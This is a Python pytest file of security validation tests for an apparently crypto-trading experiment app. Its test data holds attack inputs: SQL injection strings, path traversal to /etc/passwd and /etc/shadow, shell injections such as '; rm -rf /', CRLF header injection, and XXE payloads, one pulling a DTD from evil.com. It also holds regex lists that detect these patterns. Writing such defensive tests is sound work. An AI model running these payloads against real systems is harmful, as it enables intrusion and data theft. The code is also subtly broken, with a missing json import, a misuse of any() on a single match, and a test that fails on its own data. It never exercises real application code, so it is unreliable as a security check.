"""
Security Validation Tests
Focus: Input validation, injection prevention, authentication, authorization
"""

import pytest
import re
from unittest.mock import Mock, patch
import sys
import os

# Test framework setup
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))


class TestSecurityValidation:
    """Security validation tests"""

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks"""
        # Mock SQL queries with potential injection
        dangerous_inputs = [
            "'; DROP TABLE experiments; --",
            "1' OR '1'='1",
            "admin'--",
            "'; SELECT * FROM users; --",
            "'; DELETE FROM experiments WHERE id='1"
        ]

        safe_inputs = [
            "BTC/USDT",
            "experiment_123",
            "normal_symbol",
            "regular_name_456"
        ]

        for dangerous in dangerous_inputs:
            # Should detect and reject dangerous patterns
            sql_patterns = [
                r"';",
                r"--",
                r"DROP",
                r"DELETE",
                r"SELECT.*FROM",
                r"OR.*=",
                r"UNION"
            ]

            is_dangerous = any(re.search(pattern, dangerous, re.IGNORECASE) for pattern in sql_patterns)
            assert is_dangerous, f"Input {dangerous} should be flagged as dangerous"

        for safe in safe_inputs:
            # Should accept safe inputs
            sql_patterns = [
                r"';",
                r"--",
                r"DROP",
                r"SELECT"
            ]
            is_safe = not any(re.search(pattern, safe, re.IGNORECASE) for pattern in sql_patterns)
            assert is_safe, f"Input {safe} is incorrectly flagged as dangerous"

    def test_input_sanitization_numbers_only(self):
        """Test sanitization for number-only input fields"""
        # Test numeric fields that should only accept numbers
        numeric_fields = {
            "generations": 100,
            "population_size": 50,
            "timeframe_minutes": 60
        }

        # Valid numeric inputs
        valid_numbers = ["100", "50.5", "60", "0", "-10", "+100"]

        # Invalid non-numeric inputs
        invalid_inputs = ["not_a_number", "SELECT", "DROP", "alert('XSS')", "<script>", "'); --"]

        for field in numeric_fields:
            for valid in valid_numbers:
                try:
                    # Should accept valid numbers (including string representations)
                    num_value = float(valid)
                    assert isinstance(num_value, (int, float))
                except ValueError:
                    if valid not in ["", "<script>"]:  # Some are intentionally not numeric
                        pytest.fail(f"Valid input '{valid}' should convert to number")

            for invalid in invalid_inputs:
                # Should reject or sanitize invalid inputs
                try:
                    num_value = float(invalid)
                    # If conversion succeeds, check if it's reasonable
                    if abs(num_value) > 1000000:  # Unreasonably large values should be suspect
                        pytest.fail(f"Value {invalid} converts to unreasonably large number")
                except ValueError:
                    # Should fail conversion for truly invalid inputs
                    pass

    def test_path_traversal_attacks(self):
        """Test prevention of path traversal attacks"""
        # Common path traversal patterns
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "../../../../etc/shadow",
            ".//etc//passwd",
            "....//....//....//etc/passwd"
        ]

        safe_paths = [
            "config.json",
            "data/experiments/all_expr.json",
            "logs/app.log",
            "settings/default.cfg"
        ]

        # Test detection of malicious paths
        for payload in traversal_payloads:
            # Should detect traversal patterns
            traversal_patterns = [r"\.\./", r"\\.*\\", r"/etc/", r"/windows/", r"\.\."]

            is_traversal = any(re.search(pattern, payload, re.IGNORECASE) for pattern in traversal_patterns)
            assert is_traversal, f"Payload {payload} should be detected as path traversal"

            # For file operations, should normalize path and check bounds
            normalized = os.path.normpath(payload)

            # Should not allow access outside intended directory
            if ".." in normalized:
                assert normalized != os.path.abspath(normalized), "Traversal attempt should be blocked"

        # Test safe path validation
        for safe_path in safe_paths:
            normalized = os.path.normpath(safe_path)
            is_safe = not any(re.search(r"\.\./", safe_path)) and "etc" not in safe_path.lower()
            assert is_safe, f"Safe path {safe_path} incorrectly flagged as dangerous"

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks"""
        # Potentially dangerous command input patterns
        dangerous_commands = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& echo 'pwned'",
            "`whoami`",
            "$(cat /etc/passwd)"
        ]

        safe_commands = [
            "np.array(data)",
            "model.predict(X)",
            "indicator.rsi(close, period=14)",
            "strategy.execute()"
        ]

        # Test command injection detection
        injection_patterns = [
            r";",
            r"\|",
            r"&&",
            r"\$\(",
            r"`[^`]*`",
            r"rm\s+",
            r"cat\s+/",
            r"echo\('pwned'\)"
        ]

        for dangerous in dangerous_commands:
            is_injection = any(re.search(pattern, dangerous, re.IGNORECASE) for pattern in injection_patterns)
            assert is_injection, f"Command {dangerous} should be detected as injection attempt"

            # Should prevent execution
            if ";" in dangerous or "|" in dangerous or "&&" in dangerous:
                # These should be escaped or rejected
                escaped = dangerous.replace(";", "").replace("|", "").replace("&&", "")
                clean = escaped.replace("rm -rf /", "").strip()
                assert clean != dangerous, "Command injection should be prevented"

        # Test safe command validation
        for safe in safe_commands:
            is_safe = not any(re.search(pattern, safe) for pattern in injection_patterns)
            assert is_safe, f"Safe command {safe} incorrectly flagged as dangerous"

    def test_input_length_limits(self):
        """Test enforcement of input length limits"""
        # Define length limits for different input types
        limits = {
            "strategy_name": 100,
            "experiment_description": 500,
            "symbol": 20,
            "api_key": 100
        }

        # Test inputs that exceed limits
        oversize_inputs = {
            "strategy_name": "a" * 150,  # Exceeds 100
            "experiment_description": "b" * 600,  # Exceeds 500
            "symbol": "c" * 30,  # Exceeds 20
            "api_key": "d" * 150  # Exceeds 100
        }

        # Test inputs within limits
        valid_inputs = {
            "strategy_name": "a" * 80,  # Within 100
            "experiment_description": "b" * 400,  # Within 500
            "symbol": "BTC/USDT",  # Within 20
            "api_key": "x" * 80  # Within 100
        }

        # Test length validation
        for field, oversize in oversize_inputs.items():
            max_length = limits[field]
            assert len(oversize) > max_length, f"Input for {field} should exceed limit"

            # Should trim or reject oversize inputs
            if len(oversize) > max_length * 1.5:  # Severely oversized
                should_reject = True
            else:
                # Consider truncation
                should_reject = False

        for field, valid in valid_inputs.items():
            max_length = limits[field]
            assert len(valid) <= max_length, f"Input for {field} should be within limit"

            # Valid inputs should be accepted
            assert len(valid) > 0  # Not empty

    def test_authentication_bypass_attempts(self):
        """Test prevention of authentication bypass attempts"""
        # Mock authentication scenarios
        auth_attempts = [
            {
                "username": "admin",
                "password": "password' OR '1'='1",
                "should_be_valid": False
            },
            {
                "username": "'; DROP TABLE users; --",
                "password": "pass",
                "should_be_valid": False
            },
            {
                "username": "normal_user",
                "password": "secure_password123",
                "should_be_valid": True  # Would be valid if no injection
            }
        ]

        for attempt in auth_attempts:
            # Test for injection patterns
            injection_found = re.search(r"('|\(|--|DROP|UNION|SELECT)", attempt["username"] + attempt["password"], re.IGNORECASE)

            if attempt["should_be_valid"] and injection_found:
                pytest.fail("Valid credentials incorrectly flagged due to false positive")

            if not attempt["should_be_valid"] and not injection_found:
                pytest.fail("Injection attempt not detected")

        # Test password strength requirements
        weak_passwords = ["123", "password", "abc", ""]
        strong_passwords = ["P@ssw0rd123", "#Secure2024!", "Str0ngP@55"]

        for weak in weak_passwords:
            # Basic weakness checks
            is_weak = (
                len(weak) < 8 or
                not re.search(r"[A-Z]", weak) or
                not re.search(r"[a-z]", weak) or
                not re.search(r"[0-9]", weak)
            )
            if weak != "":  # Empty password is handled separately
                assert is_weak, f"Password '{weak}' should be flagged as weak"

        for strong in strong_passwords:
            has_upper = bool(re.search(r"[A-Z]", strong))
            has_lower = bool(re.search(r"[a-z]", strong))
            has_digit = bool(re.search(r"[0-9]", strong))
            has_symbol = bool(re.search(r"[^A-Za-z0-9]", strong))

            is_strong = all([has_upper, has_lower, has_digit, has_symbol])
            assert is_strong, f"Password '{strong}' should be flagged as strong"

    def test_cors_header_manipulation(self):
        """Test prevention of CORS header manipulation"""
        # Mock HTTP requests with CORS-related headers
        cors_headers = [
            ("Origin", "http://malicious-site.com"),
            ("Referer", "http://attack-vector.net"),
            ("Host", "vulnerable-host.attacker.com")
        ]

        allowed_origins = ["http://localhost:3000", "https://app.domain.com"]

        # Test origin validation
        for header, value in cors_headers:
            if header in ["Origin", "Referer"]:
                # Should validate against allowed origins
                is_allowed = value in allowed_origins
                if not is_allowed:
                    # Should block or sanitize
                    blocked = True
                else:
                    blocked = False

                if "malicious" in value or "attack" in value:
                    assert blocked, f"CORS header {header}: {value} should be blocked"

        # Test header injection attempts
        malicious_headers = [
            "X-Custom: value\r\nX-Injected: malicious",
            "Origin: http://trusted.com\r\nSet-Cookie: session=evil",
            "Content-Type: application/json\r\n\r\nmalicious content"
        ]

        for header_value in malicious_headers:
            # Should detect header injection
            has_injection = re.search(r"[\r\n]+", header_value)
            assert has_injection, f"Header injection not detected in: {header_value[:30]}..."

            # Should reject or sanitize such headers
            sanitized = re.sub(r"[\r\n]+.*$", "", header_value)
            assert "\r\n" not in sanitized, "Header injection should be sanitized"

    def test_rate_limiting_effectiveness(self):
        """Test rate limiting to prevent abuse"""
        import time
        from collections import defaultdict

        # Mock rate limiter
        request_counts = defaultdict(list)
        rate_limits = {
            "login_attempts": {"max_per_minute": 5, "window_seconds": 60},
            "api_calls": {"max_per_minute": 100, "window_seconds": 60},
            "config_updates": {"max_per_minute": 10, "window_seconds": 60}
        }

        def check_rate_limit(endpoint, client_id, current_time=None):
            if current_time is None:
                current_time = time.time()

            counts = request_counts[(client_id, endpoint)]
            # Remove old requests outside the window
            window_start = current_time - rate_limits[endpoint]["window_seconds"]
            counts[:] = [t for t in counts if t > window_start]

            if len(counts) >= rate_limits[endpoint]["max_per_minute"]:
                return False, "Rate limit exceeded"

            counts.append(current_time)
            return True, "OK"

        # Test rate limiting
        endpoints = ["login_attempts", "api_calls", "config_updates"]
        client = "test_client"

        for endpoint in endpoints:
            # Fill the rate limit
            max_requests = rate_limits[endpoint]["max_per_minute"]

            for i in range(max_requests):
                allowed, msg = check_rate_limit(endpoint, client, time.time())
                assert allowed, f"Request {i+1} should be allowed"

            # Next request should be blocked
            allowed, msg = check_rate_limit(endpoint, client, time.time())
            if not allowed:
                assert msg == "Rate limit exceeded"
            else:
                # If allowed, this rate limiting is less strict
                pass

    def test_xml_external_entity_prevention(self):
        """Test prevention of XML External Entity (XXE) attacks"""
        # Mock XML-like inputs that could contain XXE
        xxe_payloads = [
            """<?xml version="1.0"?>
            <!DOCTYPE root [
                <!ENTITY test SYSTEM "file:///etc/passwd">
            ]>
            <root>&test;</root>""",
            """<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">
            &xxe;""",
            """<?xml version="1.0"?>
            <!DOCTYPE config [
                <!ENTITY file SYSTEM "file:///c:/windows/win.ini">
            ]>
            <config>&file;</config>"""
        ]

        safe_configs = [
            """<config><setting name="debug">true</setting></config>""",
            """{"config": {"debug": true}}""",
            """ini
[main]
debug=true
            ini"""
        ]

        # Test XXE detection patterns
        xxe_patterns = [
            r"<!DOCTYPE.*\[",
            r"<!ENTITY",
            r"&[^;]*;",
            r"SYSTEM\s+\"[^\"]*\"",
            r"file://",
            r"http://.*\.com"
        ]

        for payload in xxe_payloads:
            has_xxe = any(re.search(pattern, payload, re.IGNORECASE | re.DOTALL) for pattern in xxe_patterns)
            assert has_xxe, f"XXE payload not detected: {payload[:50]}..."

            # Should prevent processing
            if "<!ENTITY" in payload or "SYSTEM" in payload:
                should_block = True
            else:
                should_block = False

            assert should_block, "XXE entity should be blocked"

        # Test safe input validation
        for safe in safe_configs:
            has_xxe = any(re.search(pattern, safe, re.IGNORECASE | re.DOTALL) for pattern in xxe_patterns)
            assert not has_xxe, f"Safe config incorrectly flagged as XXE: {safe[:30]}..."

    def test_json_injection_prevention(self):
        """Test prevention of JSON injection attacks"""
        # JSON injection payloads
        injection_payloads = [
            '{"data": "; rm -rf /"}',
            '{"config": "\\u0022}\\u0022, \\"inject\\": \\"malicious\\"}',
            '{"user": "admin", "query": "DROP TABLE users"}',
            '{"settings": {}}, "injected": "value"}--'  # Partial injection
        ]

        valid_json = [
            '{"strategy": "SMA_crossover", "period": 14}',
            '{"symbol": "BTC/USDT", "amount": 100}',
            '{"indicators": ["RSI", "MACD"], "threshold": 0.7}'
        ]

        # Test JSON injection detection
        for payload in injection_payloads:
            try:
                parsed = json.loads(payload)
                has_injection = (
                    "DROP" in payload.upper() or
                    "rm -rf" in payload or
                    "\\u0022" in payload or
                    "inject" in payload.lower()
                )
                if has_injection:
                    pytest.fail(f"JSON injection not detected: {payload}")
            except json.JSONDecodeError:
                # Invalid JSON is also a security concern
                if "DROP" in payload.upper() or "rm " in payload:
                    pass  # Expected to fail parsing
                else:
                    pytest.fail(f"Valid-looking JSON should parse: {payload}")

        # Test valid JSON acceptance
        for valid in valid_json:
            try:
                parsed = json.loads(valid)
                assert isinstance(parsed, dict)
                assert len(parsed) > 0
            except json.JSONDecodeError:
                pytest.fail(f"Valid JSON failed to parse: {valid}")